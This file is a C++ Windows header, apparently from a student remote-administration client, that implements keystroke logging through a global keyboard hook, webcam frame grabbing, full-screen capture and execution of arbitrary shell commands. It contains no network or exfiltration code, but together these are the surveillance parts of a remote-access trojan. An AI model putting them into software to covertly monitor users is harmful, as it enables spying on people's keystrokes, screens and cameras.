#pragma once
#include <dshow.h> // DirectShow header
#include <fstream>
#include <gdiplus.h>
#include <iostream>
#include <qedit.h>
#include <windows.h>

extern "C"
{
    extern GUID CLSID_SampleGrabber;
}

#pragma comment(lib, "strmiids.lib") // Link with strmiids.lib
using namespace Gdiplus;

class OperatingSystemManager final
{
  public:
    static void ShowMessageBox(const std::string &message);

    static void CaptureScreen();

    static void ShowImage(const std::string &imagePath);

    static void SetMousePosition(const int x, const int y)
    {
        SetCursorPos(x, y);
    }

    static std::vector<BYTE> GetImageFromCamera();

    static IBaseFilter *GetAllCameras(const std::string &cameraName);

    static std::string GetPressedKey()
    {
        for (int i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                std::string key = std::to_string(i);
                return key;
            }
        }
        return "<?>";
    }

    static LRESULT CALLBACK ProcessKeys(int nCode, WPARAM wParam, LPARAM lParam)
    {
        static std::vector<DWORD> keys; // Make keys static to persist across function calls
        if (nCode >= 0)
        {
            auto keyData = *reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
            DWORD vkCode = keyData.vkCode;

            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                // Only process the key if it has not already been pressed
                if (std::find(keys.begin(), keys.end(), vkCode) == keys.end())
                {
                    // Print the name of the key pressed
                    std::cout << "Key pressed: ";
                    char keyName[256] = {0};
                    // Get key name using GetKeyNameTextA
                    GetKeyNameTextA(MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC) << 16, keyName, sizeof(keyName));
                    std::cout << keyName << std::endl;
                    keys.push_back(vkCode); // Add the key to the list of pressed keys
                }
            }

            if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
            {
                // Only process the key if it was pressed
                auto it = std::find(keys.begin(), keys.end(), vkCode);
                if (it != keys.end())
                {
                    // Print the name of the key released
                    std::cout << "Key released: ";
                    char keyName[256] = {0};
                    // Get key name using GetKeyNameTextA
                    GetKeyNameTextA(MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC) << 16, keyName, sizeof(keyName));
                    std::cout << keyName << std::endl;
                    keys.erase(it); // Remove the key from the list of pressed keys
                }
            }
        }

        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    static HHOOK StartCapturingKeyboard()
    {
        // Start capturing keyboard input
        HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKeys, NULL, 0);
        return keyboardHook;
    }

    static void RunCMDCommand(const std::string &command)
    {
        // Open a pipe to the command
        FILE *pipe = popen(command.c_str(), "r");
        if (!pipe)
        {
            std::cerr << "Error executing command" << std::endl;
            return;
        }

        // Read the output from the command
        char buffer[128];
        std::string result;
        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        {
            result += buffer; // Append the output to result
        }

        // Close the pipe
        fclose(pipe);

        // Output the captured result and append "> 2" to it
        std::cout << result << std::endl;
    }

  private:
    static bool GetEncoderClsid(const WCHAR *format, CLSID *pClsid);

    static void GetAllEncoders();

    static std::vector<BYTE> SaveDataToMemoryStream(IStream *pStream, HRESULT hr);

    static void SaveBytesToFile(const std::vector<BYTE> &data, const std::string &file_path);
};

inline void OperatingSystemManager::ShowImage(const std::string &imagePath)
{
    // Some interface that will work with operating system.
    std::cout << "Showing image: " << imagePath << "\n";
}

inline IBaseFilter *OperatingSystemManager::GetAllCameras(const std::string &cameraName)
{
    ICreateDevEnum *pDevEnum = nullptr;
    IEnumMoniker *pEnum = nullptr;
    IBaseFilter *pCapFilter = nullptr;

    // Initialize COM
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);

    // Create the System Device Enumerator
    hr = CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum,
                          reinterpret_cast<void **>(&pDevEnum));
    if (FAILED(hr))
    {
        std::cerr << "Failed to create System Device Enumerator." << std::endl;
        return nullptr;
    }

    // Enumerate video capture devices
    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
    if (FAILED(hr) || !pEnum)
    {
        std::cerr << "No video capture devices found." << std::endl;
        pDevEnum->Release();
        return nullptr;
    }

    // Iterate over devices
    IMoniker *pMoniker = nullptr;
    while (pEnum->Next(1, &pMoniker, nullptr) == S_OK)
    {
        IPropertyBag *pPropBag;
        hr = pMoniker->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pPropBag);
        if (SUCCEEDED(hr))
        {
            VARIANT varName;
            VariantInit(&varName);
            hr = pPropBag->Read(L"FriendlyName", &varName, 0);
            if (SUCCEEDED(hr))
            {
                std::wstring ws(varName.bstrVal, SysStringLen(varName.bstrVal));
                if (std::string(ws.begin(), ws.end()) == cameraName)
                {
                    // Found the matching camera
                    hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void **)&pCapFilter);
                    VariantClear(&varName);
                    pPropBag->Release();
                    pMoniker->Release();
                    break;
                }
                VariantClear(&varName);
            }
            pPropBag->Release();
        }
        pMoniker->Release();
    }

    pEnum->Release();
    pDevEnum->Release();
    return pCapFilter; // Will return null if no matching camera found
}

inline std::vector<BYTE> OperatingSystemManager::GetImageFromCamera()
{
    std::string cameraName = "Integrated Camera";
    IBaseFilter *pCapFilter = OperatingSystemManager::GetAllCameras(cameraName);
    if (!pCapFilter)
    {
        std::cerr << "Failed to get camera\n";
        return {};
    }

    IGraphBuilder *pGraph = nullptr;
    ICaptureGraphBuilder2 *pBuilder = nullptr;
    ISampleGrabber *pSampleGrabber = nullptr;
    IBaseFilter *pGrabberFilter = nullptr;
    IMediaControl *pControl = nullptr;
    std::vector<BYTE> imageData;

    HRESULT hr =
        CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void **)&pGraph);
    if (FAILED(hr))
    {
        std::cerr << "Failed to create Filter Graph.\n";
        pCapFilter->Release();
        return {};
    }

    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, nullptr, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2,
                          (void **)&pBuilder);
    if (FAILED(hr))
    {
        std::cerr << "Failed to create Capture Graph Builder.\n";
        pCapFilter->Release();
        pGraph->Release();
        return {};
    }
    pBuilder->SetFiltergraph(pGraph);

    hr =
        CoCreateInstance(CLSID_SampleGrabber, nullptr, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void **)&pGrabberFilter);
    if (FAILED(hr))
    {
        std::cerr << "Failed to create Sample Grabber Filter.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        return {};
    }

    hr = pGrabberFilter->QueryInterface(IID_ISampleGrabber, (void **)&pSampleGrabber);
    if (FAILED(hr))
    {
        std::cerr << "Failed to get ISampleGrabber interface.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Configure the Sample Grabber
    AM_MEDIA_TYPE mt;
    ZeroMemory(&mt, sizeof(mt));
    mt.majortype = MEDIATYPE_Video;
    mt.subtype = MEDIASUBTYPE_RGB24; // 24-bit RGB format.. Can be changed to RGB8
    hr = pSampleGrabber->SetMediaType(&mt);
    if (FAILED(hr))
    {
        std::cerr << "Failed to set media type on Sample Grabber.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Add filters to graph
    hr = pGraph->AddFilter(pCapFilter, L"Video Capture");
    if (FAILED(hr))
    {
        std::cerr << "Failed to add Video Capture Filter to Graph.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    hr = pGraph->AddFilter(pGrabberFilter, L"Sample Grabber");
    if (FAILED(hr))
    {
        std::cerr << "Failed to add Sample Grabber Filter to Graph.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Render the preview stream
    hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCapFilter, pGrabberFilter, nullptr);
    if (FAILED(hr))
    {
        std::cerr << "Failed to render stream.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Start the graph
    hr = pGraph->QueryInterface(IID_IMediaControl, (void **)&pControl);
    if (FAILED(hr))
    {
        std::cerr << "Failed to get IMediaControl interface.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }
    hr = pControl->Run();
    if (FAILED(hr))
    {
        std::cerr << "Failed to start the graph.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Wait for the frame to capture
    Sleep(10000); // Allow time to stabilize the capture stream

    // Get the buffer size and allocate memory
    long bufferSize = 0;
    hr = pSampleGrabber->GetCurrentBuffer(&bufferSize, nullptr);
    if (FAILED(hr))
    {
        std::cerr << "Failed to get buffer size.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    imageData.resize(bufferSize);
    hr = pSampleGrabber->GetCurrentBuffer(&bufferSize, (long *)imageData.data());
    if (FAILED(hr))
    {
        std::cerr << "Failed to grab the frame.\n";
        pCapFilter->Release();
        pGraph->Release();
        pBuilder->Release();
        pGrabberFilter->Release();
        return {};
    }

    // Clean up
    pControl->Stop();
    pCapFilter->Release();
    pGraph->Release();
    pBuilder->Release();
    pGrabberFilter->Release();
    pSampleGrabber->Release();
    pControl->Release();

    return imageData; // Return the raw RGB image data
}

inline bool OperatingSystemManager::GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    // Initialize GDI+.
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    UINT num;  // number of image encoders
    UINT size; // size, in bytes, of the image encoder array

    // How many encoders are there?
    // How big (in bytes) is the array of all ImageCodecInfo objects?
    GetImageEncodersSize(&num, &size);

    if (size == 0)
        return false;

    auto *pImageCodecInfo = static_cast<ImageCodecInfo *>(malloc(size));
    if (!pImageCodecInfo)
        return false;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT i = 0; i < num; ++i)
    {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return true;
        }
    }

    free(pImageCodecInfo);
    GdiplusShutdown(gdiplusToken);
    return false;
}

inline void OperatingSystemManager::GetAllEncoders()
{
    // Initialize GDI+.
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    UINT num;  // number of image encoders
    UINT size; // size, in bytes, of the image encoder array

    ImageCodecInfo *pImageCodecInfo;

    // How many encoders are there?
    // How big (in bytes) is the array of all ImageCodecInfo objects?
    GetImageEncodersSize(&num, &size);

    std::cout << "Number of encoders: " << num << "\n";

    // Create a buffer large enough to hold the array of ImageCodecInfo
    // objects that will be returned by GetImageEncoders.
    pImageCodecInfo = (ImageCodecInfo *)(malloc(size));

    // GetImageEncoders creates an array of ImageCodecInfo objects
    // and copies that array into a previously allocated buffer.
    // The third argument, imageCodecInfo, is a pointer to that buffer.
    GetImageEncoders(num, size, pImageCodecInfo);

    // Display the graphics file format (MimeType)
    // for each ImageCodecInfo object.
    for (UINT j = 0; j < num; ++j)
    {
        std::wcout << pImageCodecInfo[j].MimeType << "\n";
    }

    free(pImageCodecInfo);
    GdiplusShutdown(gdiplusToken);
}

inline std::vector<BYTE> OperatingSystemManager::SaveDataToMemoryStream(IStream *pStream, HRESULT hr)
{
    // Get the size of the image data in the memory stream
    LARGE_INTEGER liZero = {0};
    ULARGE_INTEGER ulSize;
    hr = pStream->Seek(liZero, STREAM_SEEK_END, &ulSize);
    if (FAILED(hr))
    {
        std::cerr << "Failed to seek to end of memory stream\n";
        pStream->Release();
        return {};
    }

    // Allocate memory for the stream
    std::vector<BYTE> data(ulSize.QuadPart);

    // Seek to the beginning of the stream
    hr = pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
    if (FAILED(hr))
    {
        std::cerr << "Failed to seek to beginning of memory stream\n";
        pStream->Release();
        return {};
    }

    // Read the image data from the stream
    ULONG bytesRead;
    hr = pStream->Read(data.data(), ulSize.QuadPart, &bytesRead);
    if (FAILED(hr))
    {
        std::cerr << "Failed to read image data from memory stream\n";
        pStream->Release();
        return {};
    }

    // Save the image data to a file
    std::cout << "Captured data as bytes, size: " << data.size() << " bytes\n";

    // Clean up
    pStream->Release();
    return data;
}

inline void OperatingSystemManager::SaveBytesToFile(const std::vector<BYTE> &data, const std::string &file_path)
{
    std::ofstream outFile(file_path, std::ios::binary); // Open the file in binary mode
    if (!outFile)
    {
        std::wcerr << L"Error opening file for writing\n";
        return;
    }

    outFile.write(reinterpret_cast<const char *>(data.data()), static_cast<std::streamsize>(data.size()));
    outFile.close();
}

inline void OperatingSystemManager::ShowMessageBox(const std::string &message)
{
    MessageBoxA(nullptr, message.c_str(), "Message", MB_OK);
}

inline void OperatingSystemManager::CaptureScreen()
{
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HWND desktop = GetDesktopWindow();
    const HDC desktopHdc = GetDC(desktop);
    const HDC captureHdc = CreateCompatibleDC(desktopHdc);
    HBITMAP captureBitmap = CreateCompatibleBitmap(desktopHdc, width, height);
    SelectObject(captureHdc, captureBitmap);
    BitBlt(captureHdc, 0, 0, width, height, desktopHdc, 0, 0, SRCCOPY);

    // Get the CLSID of the JPEG encoder
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);

    Bitmap bitmap(captureBitmap, nullptr);

    // Saving using Stream
    IStream *pStream = nullptr;
    const HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsid, nullptr);
    const std::vector<BYTE> output_data = SaveDataToMemoryStream(pStream, hr);

    // Saving using file
    SaveBytesToFile(output_data, "C:/2025/Uni/Remote Admin Tool/client/capture.jpg");
}
